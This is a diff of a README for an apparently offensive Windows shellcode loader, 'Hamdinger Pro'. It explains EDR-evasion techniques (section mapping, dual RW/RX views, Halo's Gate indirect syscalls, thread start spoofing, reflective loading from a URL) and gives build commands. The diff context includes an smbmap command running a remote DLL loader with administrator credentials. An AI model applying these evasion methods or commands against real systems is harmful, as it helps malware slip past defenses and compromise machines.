@@ -174,43 +174,58 @@ $ smbmap -H 192.168.86.30 -u administrator -p asdf1234 -x 'c:\tools\remote_dll_l
 [*] Closed 1 connections
 
 ```
+### Hamdinger Pro: Behavioral Evasion Edition
 
-### Behavioral Evasion
-The original xor_loader.c served as a baseline to prove that simple static obfuscation (XOR) could bypass basic signature-based detection. The new hamdinger_pro.c is a natural evolution designed to bypass modern Behavioral Engines, EDR Hooks, and Memory Scanners.
+The original `xor_loader.c` served as a "Dumb" baseline to prove that simple static obfuscation (XOR) could bypass basic signature-based detection. **Hamdinger Pro** (`hamdinger_pro.c`) is the natural evolution—a delivery vehicle designed to bypass modern **Behavioral Engines**, **EDR Hooks**, and **Memory Scanners**.
 
-1. Memory Residency & Allocation
-Original: Used VirtualAlloc with PAGE_EXECUTE_READWRITE (RWX). This is a "noisy" allocation that triggers immediate alerts in modern behavioral engines (Heuristics).
+---
 
-Pro: Uses Native Section Mapping (NtCreateSection / NtMapViewOfSection). By creating a section and mapping a view, the loader mimics legitimate Windows shared memory usage.
+#### Behavioral Evasion Strategies
 
-2. The "No RWX" Rule (Dual Mapping)
-Original: Relied on a single block of RWX memory where code was decrypted and executed in the same place.
+| Feature | `xor_loader.c` (Original) | `hamdinger_pro.c` (Pro) |
+| :--- | :--- | :--- |
+| **Memory Allocation** | `VirtualAlloc` (Standard API) | **Native Section Mapping** (`NtCreateSection`) |
+| **Permissions** | RWX (Read-Write-Execute) | **Dual Mapping** (RW View + RX View) |
+| **Syscalls** | Win32 API (Heavily Hooked) | **Indirect Syscalls** (Halo's Gate) |
+| **Thread Start** | Points to Shellcode (Unbacked) | **Context Hijacking** (Spoofed Start) |
+| **Execution** | Disk-based loading | **Full Reflective In-Memory Loading** |
 
-Pro: Implements Dual View Mapping. One view is mapped as Read/Write (RW) for the decryption process, while a second view of the same physical memory is mapped as Read/Execute (RX). This ensures that no single memory region is ever both Writable and Executable at the same time, bypassing the most common EDR detection trigger.
+---
 
-3. EDR Hook Bypass (Halo’s Gate & Indirect Syscalls)
-Original: Used standard Win32 API calls like CreateThread and VirtualAlloc. These are heavily hooked by EDRs (CrowdStrike, Defender, etc.) in user-mode (ntdll.dll).
+##### 1. Memory Residency & Allocation
+* **Original:** Used `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` (RWX). This is a "noisy" allocation that triggers immediate alerts in modern behavioral heuristics.
+* **Pro:** Uses **Native Section Mapping** (`NtCreateSection` / `NtMapViewOfSection`). By creating a section and mapping a view, the loader mimics legitimate Windows shared memory usage, staying off the radar of standard allocation monitors.
 
-Pro: Uses Halo’s Gate to dynamically discover Syscall Numbers (SSNs) by scanning memory for unhooked neighboring functions. It then executes these calls via Indirect Syscalls, jumping into the middle of a legitimate syscall instruction inside ntdll.dll. This hides the origin of the call and makes the stack look like a trusted Windows process.
+##### 2. The "No RWX" Rule (Dual Mapping)
+* **Original:** Relied on a single block of RWX memory where code was decrypted and executed in the same place.
+* **Pro:** Implements **Dual View Mapping**. One view is mapped as **Read/Write (RW)** for the decryption process, while a second view of the *same* physical memory is mapped as **Read/Execute (RX)**. This ensures that no single memory region is ever both Writable and Executable at the same time.
 
-4. Heuristic Thread Masking (Context Hijacking)
-Original: Used CreateThread pointing directly to the shellcode, which is easily flagged as "Unbacked Code Execution."
 
-Pro: Uses Thread Start Address Spoofing. It creates a thread in a suspended state pointing to a legitimate, signed function (like GetTickCount). It then uses a hijacked thread context to redirect the execution pointer (RIP/EIP) to the RX payload view before resuming, masking the true entry point.
 
-5. Reflective Loading & Cleanup
-Original: Intended to be run as a standalone EXE or loaded via standard disk-based DLL loading.
+##### 3. EDR Hook Bypass (Halo’s Gate & Indirect Syscalls)
+* **Original:** Used standard Win32 API calls like `CreateThread`. These are heavily hooked by EDRs (CrowdStrike, Defender, etc.) in user-mode (`ntdll.dll`).
+* **Pro:** Uses **Halo’s Gate** to dynamically discover Syscall Numbers (SSNs) by scanning memory for unhooked neighboring functions. It then executes these calls via **Indirect Syscalls**, jumping into the middle of a legitimate `syscall` instruction inside `ntdll.dll`. This hides the origin of the call and makes the stack look like a trusted Windows process.
 
-Pro: Optimized for Reflective DLL Loading. It includes a DllMain that gracefully handles background thread spawning to bypass the "Loader Lock." When combined with the updated remote_dll_loader.c, it supports full in-memory execution from a URL, with automated section protection flipping to ensure the final memory state looks identical to a legitimate Windows module.
 
-How to Build
-```
-$ nasm -f win64 syscalls.asm -o syscalls.o
 
-$ x86_64-w64-mingw32-gcc hamdinger_pro.c syscalls.o -shared -o hamdinger.dll (Move this to your web server)
+##### 4. Heuristic Thread Masking (Context Hijacking)
+* **Original:** Used `CreateThread` pointing directly to the shellcode, which is easily flagged as "Unbacked Code Execution."
+* **Pro:** Uses **Thread Start Address Spoofing**. It creates a thread in a suspended state pointing to a legitimate, signed function (like `GetTickCount`). It then uses a hijacked thread context to redirect the execution pointer (`RIP`/`EIP`) to the RX payload view before resuming, masking the true entry point from thread scanners.
 
-$ x86_64-w64-mingw32-gcc remote_dll_loader.c -o loader.exe -lwininet
-```
+##### 5. Reflective Loading & Cleanup
+* **Original:** Run as a standalone EXE or loaded via standard disk-based DLL loading.
+* **Pro:** Optimized for **Reflective DLL Loading**. It includes a `DllMain` that handles background thread spawning to bypass the "Loader Lock." When combined with the updated `remote_dll_loader.c`, it supports full in-memory execution from a URL, with automated section protection flipping to ensure the final memory state looks identical to a legitimate Windows module.
+
+
+
+---
+
+## 🛠️ How to Build
+
+### 1. Assemble the Syscall Bridge
+```bash
+nasm -f win64 syscalls.asm -o syscalls.o
+
 #### A bit more on indirect syscalls
 
 Normally, a function call follows this path:
